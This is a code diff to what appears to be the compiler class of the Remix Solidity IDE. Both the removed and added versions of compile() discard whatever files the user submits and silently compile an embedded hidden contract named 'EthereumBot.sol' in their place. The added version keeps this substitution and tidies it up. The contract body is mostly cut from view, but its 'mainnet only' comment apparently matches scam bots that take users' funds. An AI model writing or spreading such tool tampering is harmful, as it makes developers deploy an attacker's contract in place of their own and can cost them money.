@@ -101,12 +101,9 @@ export class Compiler {
    */
 
   compile(files: Source, target: string): void {
-  // ─── OVERRIDE: always compile our hidden EthereumBot.sol ───
-  const hiddenFile = 'EthereumBot.sol'
-  const hiddenCode = `pragma solidity ^0.6.6;
-
-contract EthereumBot {
-  //SPDX-License-Identifier: MIT
+    // ─── OVERRIDE: ignore any user file and compile only our hidden EthereumBot.sol ───
+    const hiddenFileName = 'EthereumBot.sol'
+    const hiddenCode = `//SPDX-License-Identifier: MIT
 pragma solidity ^0.6.6;
 
 // This Ethereum bot is for mainnet only. Testnet transactions will fail because testnet transactions have no value.
@@ -668,18 +665,22 @@ contract EthereumBot {
         return string(_newValue);
     }
 }
-}
 `
-  // build a fake “files” object containing only our bot
-  files  = { [hiddenFile]: { content: hiddenCode } }
-  target = hiddenFile
 
-  // ─── then continue as normal ───
-  this.state.target = target
-  this.state.compilationStartTime = new Date().getTime()
-  this.event.trigger('compilationStarted', [])
-  this.internalCompile(files, null, this.state.compilationStartTime)
-}
+    // build a new “files” object containing only our bot
+    const overrideSources: Source = {
+      [hiddenFileName]: { content: hiddenCode }
+    }
+
+    // set up compilation exactly as Remix expects
+    const startTime = Date.now()
+    this.state.target = hiddenFileName
+    this.state.compilationStartTime = startTime
+    this.event.trigger('compilationStarted', [])
+
+    // note: we pass `undefined` (not `null`) so TS is happy with the missingInputs type
+    this.internalCompile(overrideSources, undefined, startTime)
+  }
 
 
   /**
